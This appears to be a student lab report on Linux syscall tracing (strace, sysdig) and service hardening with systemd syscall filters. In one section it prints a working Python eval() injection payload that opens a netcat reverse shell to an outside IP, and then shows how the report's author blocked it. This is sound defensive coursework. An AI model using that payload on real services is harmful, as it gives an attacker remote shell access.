# b3y-csec-2024-tp2

## 1. strace

```
write(1, "afs  bin  boot\tdev  etc  home\tli"..., 104afs  bin  boot     dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr    var
) = 104
```

```
openat(AT_FDCWD, "readme", O_RDONLY)    = 3
```

```
write(1, "Bonjour ceci est un fichier test"..., 33) = 33
```

```
% time     seconds  usecs/call     calls    errors syscall
------ ----------- ----------- --------- --------- ----------------
 28.30    0.009793          69       141           mmap
 10.89    0.003767          62        60        14 openat
  9.56    0.003308          62        53           rt_sigaction
  7.86    0.002721         160        17           poll
  7.53    0.002606          48        54           close
  6.32    0.002186          47        46           fstat
  6.00    0.002076          59        35           mprotect
  5.75    0.001990          55        36           read
  3.44    0.001189          56        21           futex
  1.71    0.000593         593         1           sendto
  1.46    0.000506          72         7           brk
  1.10    0.000382         382         1           clone3
  1.03    0.000358         358         1         1 connect
  0.90    0.000313          52         6           fcntl
  0.85    0.000293          41         7           write
  0.75    0.000260          86         3           rt_sigprocmask
  0.72    0.000249          62         4           pread64
  0.58    0.000200          50         4           setsockopt
  0.57    0.000197          98         2           newfstatat
  0.41    0.000143          71         2           socket
  0.40    0.000137         137         1           recvfrom
  0.34    0.000117          58         2         1 access
  0.32    0.000112          56         2           socketpair
  0.32    0.000110         110         1           getsockopt
  0.32    0.000109         109         1           getsockname
  0.31    0.000106          53         2           ioctl
  0.29    0.000102          51         2           getdents64
  0.25    0.000086          86         1           getpeername
  0.23    0.000081          40         2         1 arch_prctl
  0.23    0.000080          40         2           statfs
  0.22    0.000076          76         1           rseq
  0.18    0.000063          63         1           pipe
  0.16    0.000055          55         1           prlimit64
  0.15    0.000053          53         1           sysinfo
  0.15    0.000052          52         1           getrandom
  0.14    0.000050          50         1           set_robust_list
  0.14    0.000047          47         1           set_tid_address
  0.10    0.000036          36         1           munmap
  0.00    0.000000           0         1           execve
------ ----------- ----------- --------- --------- ----------------
100.00    0.034602          65       526        17 total
```

## 2. Sysdig

```
[gnathan@localhost ~]$ sudo sysdig -r trace.scap | grep "write"
814 14:36:41.502273502 0 ls (6382) > write fd=1 size=73
815 14:36:41.502479930 0 ls (6382) < write res=73 data=readme  readme.txt  .[0m.[01;31msysdig-0.39.0-x86_64.rpm.[0m  trace.scap.
```

```
[gnathan@localhost ~]$ sudo sysdig -r trace.scap | grep "openat" | grep "readme"
585 14:40:00.488856928 1 cat (6400) > openat dirfd=-100(AT_FDCWD) name=readme(readme) flags=1(O_RDONLY) mode=0
586 14:40:00.488861105 1 cat (6400) < openat fd=3(<f>readme) dirfd=-100(AT_FDCWD) name=readme(readme) flags=1(O_RDONLY) mode=0 dev=FD00 ino=25638241
```

```
[gnathan@localhost ~]$ sudo sysdig -r trace.scap | grep "write"
595 14:40:00.488971383 1 cat (6400) > write fd=1 size=33
596 14:40:00.489176348 1 cat (6400) < write res=33 data=Bonjour ceci est un fichier test.
```
[curl exemple.org](https://github.com/NathanGmd/b3y-csec-2024-tp2/blob/main/sysdig%20curl%20example.org)

# Part III : Service Hardening

```
[gnathan@localhost system]$ sudo sysdig proc.name=nginx
1050 16:55:21.911047606 0 nginx (78101.78101) < epoll_wait res=1
1051 16:55:21.911076530 0 nginx (78101.78101) > accept4 flags=0
1052 16:55:21.911114963 0 nginx (78101.78101) < accept4 fd=8(<4t>10.1.1.1:52181->10.1.1.3:80) tuple=10.1.1.1:52181->10.1.1.3:80 queuepct=0 queuelen=1 queuemax=511
1053 16:55:21.911128788 0 nginx (78101.78101) > epoll_ctl
1054 16:55:21.911135691 0 nginx (78101.78101) < epoll_ctl
1055 16:55:21.911137825 0 nginx (78101.78101) > epoll_wait maxevents=512
1056 16:55:21.911140250 0 nginx (78101.78101) < epoll_wait res=2
1057 16:55:21.911141161 0 nginx (78101.78101) > accept4 flags=0
1058 16:55:21.911148636 0 nginx (78101.78101) < accept4 fd=9(<4t>10.1.1.1:52182->10.1.1.3:80) tuple=10.1.1.1:52182->10.1.1.3:80 queuepct=0 queuelen=0 queuemax=511
1060 16:55:21.911167152 1 nginx (78100.78100) < epoll_wait res=1
1061 16:55:21.911180826 1 nginx (78100.78100) > accept4 flags=0
1062 16:55:21.911296454 1 nginx (78100.78100) < accept4 fd=-11(EAGAIN) tuple=NULL queuepct=0 queuelen=0 queuemax=0
1063 16:55:21.911314298 1 nginx (78100.78100) > epoll_wait maxevents=512
1064 16:55:21.911319717 0 nginx (78101.78101) > epoll_ctl
1065 16:55:21.911321852 1 nginx (78100.78100) > switch next=25 pgft_maj=0 pgft_min=307 vm_size=15524 vm_rss=5952 vm_swap=0
1066 16:55:21.911324597 0 nginx (78101.78101) < epoll_ctl
1067 16:55:21.911327432 0 nginx (78101.78101) > recvfrom fd=8(<4t>10.1.1.1:52181->10.1.1.3:80) size=1024
1069 16:55:21.911335557 0 nginx (78101.78101) < recvfrom res=552 data=GET / HTTP/1.1..Host: 10.1.1.3..Connection: keep-alive..Cache-Control: max-age=0 tuple=10.1.1.1:52181->10.1.1.3:80
1070 16:55:21.911368228 0 nginx (78101.78101) > newfstatat
1071 16:55:21.911393255 0 nginx (78101.78101) < newfstatat res=0 dirfd=-100(AT_FDCWD) path=/usr/share/nginx/html/index.html flags=0
1072 16:55:21.911398124 0 nginx (78101.78101) > openat dirfd=-100(AT_FDCWD) name=/usr/share/nginx/html/index.html flags=65(O_NONBLOCK|O_RDONLY) mode=0
1073 16:55:21.911410077 0 nginx (78101.78101) < openat fd=14(<f>/usr/share/nginx/html/index.html) dirfd=-100(AT_FDCWD) name=/usr/share/nginx/html/index.html flags=65(O_NONBLOCK|O_RDONLY) mode=0 dev=FD00 ino=8423251
1074 16:55:21.911412051 0 nginx (78101.78101) > fstat fd=14(<f>/usr/share/nginx/html/index.html)
1075 16:55:21.911413283 0 nginx (78101.78101) < fstat res=0
1076 16:55:21.911424614 0 nginx (78101.78101) > writev fd=8(<4t>10.1.1.1:52181->10.1.1.3:80) size=181
1077 16:55:21.911689571 0 nginx (78101.78101) < writev res=181 data=HTTP/1.1 304 Not Modified..Server: nginx/1.20.1..Date: Sun, 23 Mar 2025 15:55:21
1078 16:55:21.911701414 0 nginx (78101.78101) > write fd=5(<f>/var/log/nginx/access.log) size=187
1079 16:55:21.911734767 0 nginx (78101.78101) < write res=187 data=10.1.1.1 - - [23/Mar/2025:16:55:21 +0100] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.
1080 16:55:21.911736721 0 nginx (78101.78101) > close fd=14(<f>/usr/share/nginx/html/index.html)
1081 16:55:21.911741459 0 nginx (78101.78101) < close res=0
1082 16:55:21.911743864 0 nginx (78101.78101) > setsockopt
1083 16:55:21.911746749 0 nginx (78101.78101) < setsockopt res=0 fd=8(<4t>10.1.1.1:52181->10.1.1.3:80) level=2(SOL_TCP) optname=0(UNKNOWN) val=.... optlen=4
1084 16:55:21.911748813 0 nginx (78101.78101) > epoll_wait maxevents=512
1085 16:55:21.911753472 0 nginx (78101.78101) > switch next=0 pgft_maj=0 pgft_min=306 vm_size=15524 vm_rss=5952 vm_swap=0
2462 16:55:26.455612610 0 nginx (78101.78101) < epoll_wait res=2
2463 16:55:26.455639752 0 nginx (78101.78101) > recvfrom fd=9(<4t>10.1.1.1:52182->10.1.1.3:80) size=1024
```
syscall filter pour nginx
```
SystemCallFilter=~add_key keyring_search keyring_update truncate getdents getdents64
SystemCallFilter+=openat fstat read writev mmap setsockopt accept4 epoll_wait epoll_ctl recvfrom close
SystemCallErrorNumber=EPERM
```
# Part IV : My shitty app
Exploit .eval()
```
nc -lvnp 12345
__import__('os').system('nc 172.25.49.49 12345 -e /bin/bash')
```
## 4. Harden
```
[gnathan@localhost /]$ ps aux | grep calc.py
root       78851  0.2  0.4  10904  8576 ?        Ss   18:25   0:00 /usr/bin/python3 /opt/calc.py
```

```
[gnathan@localhost /]$ sudo sudo useradd -r -s /usr/sbin/nologin -M calculatrice
```

```
-rwx------. 1 calculatrice calculatrice 660 Mar 23 17:24 /opt/calc.py
```

```
calcula+   78917  0.5  0.4  10844  8192 ?        Ss   18:35   0:00 /usr/bin/python3 /opt/calc.py
```
sysdig syscall pendant execution de calc.py
```
[gnathan@localhost /]$ sudo sysdig -r trace.scap | awk '{print $7}' | sort | uniq
accept4
access
arch_prctl
bind
brk
close
dup
epoll_create1
execve
exit_group
fcntl
fstat
futex
getdents64
getegid
geteuid
getgid
getpeername
getrandom
getsockname
getuid
ioctl
listen
lseek
mmap
mprotect
munmap
newfstatat
openat
pread
prlimit
procexit
read
readlink
recvfrom
rseq
rt_sigaction
sendto
set_robust_list
set_tid_address
setsockopt
socket
switch
sysinfo
write
```
sysdig syscall pendant hack de calc.py
```
[gnathan@localhost /]$ sudo sysdig -r trace.scap | awk '{print $7}' | sort | uniq
accept4
access
arch_prctl
bind
brk
clone3
close
dup
epoll_create1
execve
exit_group
fcntl
fstat
futex
getdents64
getegid
geteuid
getgid
getpeername
getrandom
getsockname
getuid
ioctl
listen
lseek
mmap
mprotect
munmap
newfstatat
openat
pread
prlimit
procexit
read
readlink
recvfrom
rseq
rt_sigaction
rt_sigprocmask
sendto
set_robust_list
set_tid_address
setsockopt
signaldeliver
socket
switch
sysinfo
wait4
write
```
syscall supplémentaire 
```
accept4
clone3
rt_sigprocmask
signaldeliver
wait4
```

```
[Unit]
Description=Super serveur calculatrice

[Service]
ExecStart=/usr/bin/python3 /opt/calc.py
Restart=always
User=calculatrice
SystemCallFilter=~clone3 ~rt_sigprocmask ~signaldeliver ~wait4 ~accept4
```
Plus de reverse shell possible
